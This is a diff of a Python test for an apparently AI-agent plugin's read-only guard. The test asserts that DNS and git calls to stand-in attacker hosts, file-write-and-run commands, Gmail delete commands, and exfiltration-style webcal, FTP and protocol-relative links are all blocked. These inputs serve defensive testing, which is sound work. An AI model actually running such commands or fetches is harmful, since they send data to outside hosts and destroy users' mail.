@@ -222,7 +222,7 @@ def test_pre_tool_read_only_guard_blocks_mcp_writes_only_in_owned_watch_runs(har
     blocked_terminal = [plugin.native_proactive_read_only_guard(
         tool_name="terminal", args={"command": command}, session_id="watch-run")
         for command in ("nslookup x.attacker", "ping x.attacker",
-                        "git ls-remote git://attacker.example/repo",
+                        "git ls-remote attacker.example:repo",
                         "printf x > m.py && python m.py",
                         "gws gmail users messages batchDelete --ids 1",
                         "gws gmail users messages modify --id 1",
@@ -272,6 +272,10 @@ def test_pre_tool_read_only_guard_blocks_mcp_writes_only_in_owned_watch_runs(har
     mcp_tool._tool_read_only_hints["tool_gateway_research"] = {"scrapling-fetch": True}
     assert plugin.native_proactive_read_only_guard(
         tool_name=fetcher, args={"request": {"targets": ["https://x.test/?q=mail"]}}, session_id="watch-run") == blocked
+    # Any scheme or protocol-relative link is a way out, not only http(s).
+    for link in ("webcal://x.test/f.ics?d=mail", "FTP://x.test/up", "//x.test/x?d=mail"):
+        assert plugin.native_proactive_read_only_guard(
+            tool_name=fetcher, args={"feed": link}, session_id="watch-run") == blocked, link
     assert plugin.native_proactive_read_only_guard(
         tool_name="mcp__mail__search_inbox", args={"query": "from:owner subject:receipt"}, session_id="watch-run") is None
     # Deny by default (Strix vuln-0001): unknown tools are blocked; clearly read-only ones still run.
@@ -308,7 +312,7 @@ def test_pre_tool_read_only_guard_blocks_mcp_writes_only_in_owned_watch_runs(har
             assert plugin.native_proactive_read_only_guard(
                 tool_name="mcp__mail__" + name, args={}, session_id="watch-run") == blocked, (name, hint)
     # 'fetch' reads only beside plain mail words; an unmarked URL fetcher stays blocked.
-    fetchers = ("fetch", "fetch_url", "web_fetch", "fetch_page")
+    fetchers = ("fetch", "fetch_url", "web_fetch", "fetch_page", "fetch_calendar", "fetch_calendar_events", "fetch_events")
     mcp_tool._mcp_tool_server_names.update({"mcp__mail__" + name: "mail" for name in fetchers})
     mcp_tool._tool_read_only_hints["mail"] = {name: False for name in fetchers}
     for name in fetchers:
